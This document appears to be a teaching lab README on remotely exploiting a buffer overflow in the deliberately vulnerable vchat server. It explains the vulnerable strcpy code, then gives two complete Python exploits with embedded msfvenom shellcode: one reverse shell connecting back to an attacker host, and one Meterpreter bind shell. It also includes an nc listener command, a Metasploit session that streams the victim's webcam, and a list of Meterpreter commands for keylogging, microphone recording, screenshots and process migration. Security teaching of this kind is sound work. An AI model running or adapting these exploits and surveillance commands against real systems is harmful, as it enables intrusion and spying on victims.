# Remote exploit of vchat

This is a classical example of remote exploit of a buffer overflow vulnerability. Please refer to this [Blog](https://fluidattacks.com/blog/vulnserver-trun/) for extra details. 

In this post, we show how to remotely exploit [vchat](https://github.com/xinwenfu/vchat).

**Overview**

We will attack the newly added KNOCK command of vchat. The KNOCK command has a similar vulnerability to the TRUN command. In the code snippet about this command below in the function *DWORD WINAPI ConnectionHandler(LPVOID CSocket)* of vchat.c, the message sent from a user (e.g. attacker) is put into a local buffer *RecvBuf*. The following code snippet copies 3000 bytes of *RecvBuf* into another buffer *KnocBuf*, which is then passed to *Function3(KnocBuf)*.
```
char *KnocBuf = malloc(3000);
memset(KnocBuf, 0, 3000);
for (i = 6; i < RecvBufLen; i++) {
	if ((char)RecvBuf[i] == '.') {
		strncpy(KnocBuf, RecvBuf, 3000);				
		Function3(KnocBuf);
		break;
	}
}
```
In *Function3()* as shown below, *strcpy()* is used to copy the passed data pointed to by *Input* (i.e. *KnocBuf*) into a local buffer *Buffer2S[2000]*. Apparently *KnocBuf* may contain 3000 bytes of user (attacker) input and may overflow *Buffer2S* of 2000 bytes. Buffer overflow may then occur.
```
void Function3(char *Input) {
	char Buffer2S[2000];	
	strcpy(Buffer2S, Input);
}
```

It can be observerd that the remote exploit of a buffer overflow vulnarability is really similar to a local exploit. The difference is the data/message overflowing a buffer of a servr comes from a remote user/attack to the server.

**Experiment setup**
1. Windows 10 with all Exploit Protection disabled
2. [mingw-w64](http://mingw-w64.org/doku.php) installed
3. [nasm](https://www.nasm.us/) installed
4. [arwin](https://github.com/xinwenfu/arwin) installed
5. [Windows Sysinternals/listdlls](https://docs.microsoft.com/en-us/sysinternals/) installed
6. Local attack host: 10.0.2.8
7. Victim host: 10.0.2.7

## Reverse shell
* [reverse-shell.py](reverse-shell.py): This attack injects a reverse-shell code into vchat. The reverse-shell code is crafted in such a way that it connects back to the attack computer IP and port 4444. So you (attacker) shall use the following nc command to start the reverse shell
```
nc -l -v -p 4444
```
Below is the Python code of [reverse-shell.py](reverse-shell.py).
```
# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.7'   # vitcim IP. Change it to correct victim IP
PORT = 9999         # victim port. No change

# Shellcode created by msfvenom.
#   1. Change LHOST to correct attack computer/VM IP
#   2. Replace SHELL with correct generated shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a' 
SHELL =  b""
SHELL += b"\xba\xb7\x9a\xd6\x72\xd9\xea\xd9\x74\x24\xf4\x5e"
SHELL += b"\x29\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xe1"
SHELL += b"\x94\x34\x87\xf1\x41\x3a\x68\x09\x92\x5b\xe0\xec"
SHELL += b"\xa3\x5b\x96\x65\x93\x6b\xdc\x2b\x18\x07\xb0\xdf"
SHELL += b"\xab\x65\x1d\xd0\x1c\xc3\x7b\xdf\x9d\x78\xbf\x7e"
SHELL += b"\x1e\x83\xec\xa0\x1f\x4c\xe1\xa1\x58\xb1\x08\xf3"
SHELL += b"\x31\xbd\xbf\xe3\x36\x8b\x03\x88\x05\x1d\x04\x6d"
SHELL += b"\xdd\x1c\x25\x20\x55\x47\xe5\xc3\xba\xf3\xac\xdb"
SHELL += b"\xdf\x3e\x66\x50\x2b\xb4\x79\xb0\x65\x35\xd5\xfd"
SHELL += b"\x49\xc4\x27\x3a\x6d\x37\x52\x32\x8d\xca\x65\x81"
SHELL += b"\xef\x10\xe3\x11\x57\xd2\x53\xfd\x69\x37\x05\x76"
SHELL += b"\x65\xfc\x41\xd0\x6a\x03\x85\x6b\x96\x88\x28\xbb"
SHELL += b"\x1e\xca\x0e\x1f\x7a\x88\x2f\x06\x26\x7f\x4f\x58"
SHELL += b"\x89\x20\xf5\x13\x24\x34\x84\x7e\x21\xf9\xa5\x80"
SHELL += b"\xb1\x95\xbe\xf3\x83\x3a\x15\x9b\xaf\xb3\xb3\x5c"
SHELL += b"\xcf\xe9\x04\xf2\x2e\x12\x75\xdb\xf4\x46\x25\x73"
SHELL += b"\xdc\xe6\xae\x83\xe1\x32\x60\xd3\x4d\xed\xc1\x83"
SHELL += b"\x2d\x5d\xaa\xc9\xa1\x82\xca\xf2\x6b\xab\x61\x09"
SHELL += b"\xfc\xde\x75\x13\xf4\xb6\x77\x13\x15\x1b\xf1\xf5"
SHELL += b"\x7f\xb3\x57\xae\x17\x2a\xf2\x24\x89\xb3\x28\x41"
SHELL += b"\x89\x38\xdf\xb6\x44\xc9\xaa\xa4\x31\x39\xe1\x96"
SHELL += b"\x94\x46\xdf\xbe\x7b\xd4\x84\x3e\xf5\xc5\x12\x69"
SHELL += b"\x52\x3b\x6b\xff\x4e\x62\xc5\x1d\x93\xf2\x2e\xa5"
SHELL += b"\x48\xc7\xb1\x24\x1c\x73\x96\x36\xd8\x7c\x92\x62"
SHELL += b"\xb4\x2a\x4c\xdc\x72\x85\x3e\xb6\x2c\x7a\xe9\x5e"
SHELL += b"\xa8\xb0\x2a\x18\xb5\x9c\xdc\xc4\x04\x49\x99\xfb"
SHELL += b"\xa9\x1d\x2d\x84\xd7\xbd\xd2\x5f\x5c\xdd\x30\x75"
SHELL += b"\xa9\x76\xed\x1c\x10\x1b\x0e\xcb\x57\x22\x8d\xf9"
SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
SHELL += b"\xcc\xaf\xd5"

# Payload to inject into vchat. No change
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

### Notes
1. If the IP of the local host (attacker's computer) is 10.0.2.8, no need of generating the shellcode. Otherwise, use the following command to generate the shellcode with LHOST IP as the correct local host IP.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a' 
```
2. If the address of *jmp esp* comes from essfunc.dll as used in the example Python code, essfunc.dll does not use ASLR and there is no need of changing the address of *jmp esp* when Windows 10 reboots.

### Video demo

[![Video demo of vchat](https://img.youtube.com/vi/EYqQX90b5s4/0.jpg)](https://youtu.be/EYqQX90b5s4)

## Meterpreter bind shell to start camera streaming

We now change the payload to Meterpreter bind shell, as used in [bind-shell-meterpreter.py](bind-shell-meterpreter.py). Meterpreter has powerful commands, such as starting webcam stream as shown in this example. Here is the command generating the Meterpreter bind shell.
```
msfvenom -p windows/meterpreter/bind_tcp RHOST=10.0.2.13 LPORT=11111 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a'
```

At Kali, run bind-shell-meterpreter.py with python.
```
python bind-shell-meterpreter.py 
```

Start *Applications* -> *08 - Exploitation Tools* -> *metasploit framework*. Below is what I did within metasploit.
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set EXITFUNC thread
EXITFUNC => thread
msf6 exploit(multi/handler) > set RHOST 10.0.2.13
RHOST => 10.0.2.13
msf6 exploit(multi/handler) > set LPORT 11111
LPORT => 11111
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 10.0.2.13:11111
[*] Sending stage (175174 bytes) to 10.0.2.13
[*] Meterpreter session 1 opened (10.0.2.17:46565 -> 10.0.2.13:11111 ) at 2022-03-30 11:53:23 -0400

meterpreter > webcam_list
1: VirtualBox Webcam - NexiGo N930AF FHD webcam
meterpreter > webcam_stream
[*] Starting...
[*] Preparing player...
[*] Opening player at: /home/kali/NjpGiDkE.html
[*] Streaming...
```

Source code
```
# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.13'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/meterpreter/bind_tcp RHOST=10.0.2.13 LPORT=11111 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a'
SHELL =  b""
SHELL += b"\xda\xd3\xbb\x12\xea\xb7\xd4\xd9\x74\x24\xf4\x5a"
SHELL += b"\x33\xc9\xb1\x57\x83\xc2\x04\x31\x5a\x16\x03\x5a"
SHELL += b"\x16\xe2\xe7\x16\x5f\x5b\x07\xe7\xa0\x04\x36\x35"
SHELL += b"\xc4\x4f\x6a\x89\x8c\xb5\x01\xbb\x82\xbe\x47\x28"
SHELL += b"\x10\xb2\x4f\x5f\x91\x79\xa9\x6e\x22\x4c\x75\x3c"
SHELL += b"\xe0\xce\x09\x3f\x35\x31\x30\xf0\x48\x30\x75\x46"
SHELL += b"\x26\xdd\x2b\x0e\x43\x73\xdb\x3b\x11\x48\xda\xeb"
SHELL += b"\x1d\xf0\xa4\x8e\xe2\x85\x18\x90\x32\xee\xf8\xb2"
SHELL += b"\x39\xb9\xe0\xe2\x3c\xe9\x95\xca\x4b\x31\xdc\xfd"
SHELL += b"\x4c\xc2\xea\x76\xb3\x03\x23\x49\x75\x64\x4e\xe5"
SHELL += b"\x77\xbc\x68\x15\x02\xb6\x8b\xa8\x15\x0d\xf6\x76"
SHELL += b"\x93\x92\x50\xfc\x03\x77\x61\xd1\xd2\xfc\x6d\x9e"
SHELL += b"\x91\x5b\x71\x21\x75\xd0\x8d\xaa\x78\x37\x04\xe8"
SHELL += b"\x5e\x93\x4d\xaa\xff\x82\x2b\x1d\xff\xd5\x93\xc2"
SHELL += b"\xa5\x9e\x31\x14\xd9\x5e\xca\x19\x87\xc8\x07\xd4"
SHELL += b"\x38\x09\x0f\x6f\x4a\x3b\x90\xdb\xc4\x77\x59\xc2"
SHELL += b"\x13\x77\x70\xb2\x8c\x86\x7a\xc3\x85\x4c\x2e\x93"
SHELL += b"\xbd\x65\x4e\x78\x3e\x89\x9b\x15\x35\x2c\x73\x08"
SHELL += b"\xb4\xa4\x72\xa6\x45\x51\x9e\x39\x95\x41\xa1\x93"
SHELL += b"\xbe\xea\x5f\x1c\xea\x8d\xd6\xfa\x86\x41\xbe\x55"
SHELL += b"\x3f\xa0\xe5\x6d\xd8\xdb\xcc\x17\xe6\x2b\x6b\x4f"
SHELL += b"\xe7\x33\x73\x27\x8f\x84\x9a\xff\xb0\x14\x89\x57"
SHELL += b"\x27\x9f\xdd\x63\x56\xa0\xc8\xc3\x0f\x37\x87\x85"
SHELL += b"\x62\xa9\x98\x8f\x17\x29\x0c\x34\xbe\x7e\xb8\x36"
SHELL += b"\xe7\x49\x67\xc8\xc2\xc9\x6f\x36\x93\xe0\x04\x01"
SHELL += b"\x01\xbb\x72\x6e\xc5\x3b\x82\x38\x8f\x3b\xea\x9c"
SHELL += b"\xeb\x6f\x0f\xe3\x21\x1c\x9c\x76\xca\x75\x71\xd0"
SHELL += b"\xa2\x7b\xac\x16\x6d\x83\x9b\x24\x6a\x7b\x5d\x2c"
SHELL += b"\x8a\xbf\x88\xf4\xf9\xd6\x09\x43\xe1\x34\xa7\xbe"
SHELL += b"\x8a\xe0\x22\x03\xd7\x12\x99\x40\xee\x90\x2b\x39"
SHELL += b"\x15\x88\x5e\x3c\x51\x0e\xb3\x4c\xca\xfb\xb3\xe3"
SHELL += b"\xeb\x29"

# Payload to inject into vchat
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian; L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

### Video demo

[![Video demo of vchat](https://img.youtube.com/vi/FqrUCbZGD8s/0.jpg)](https://youtu.be/FqrUCbZGD8s)

## DoS
* [DoS.py](DoS.py): This attack just injects junk into vchat and causes a memory error so that vchat crashes.

## Meterpreter command

Please refer to [METERPRETER BASIC COMMANDS](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

```
help
getuid
getsystem
webcam_list
Enable webcam within VM (Devices -> Webcams -> Click the camera name)
webcam_snap 
webcam_stream
record_mic
screenshot
keyscan_start
keyscan_dump
keyscan_stop
shell
```

Screen capture
```
use espia
screengrab
```

Migrate the Meterpreter attack process to another process on the victim.
```
ps 
migrate PID  # explorer.exe
```
or
```
run post/windows/manage/migrate
```
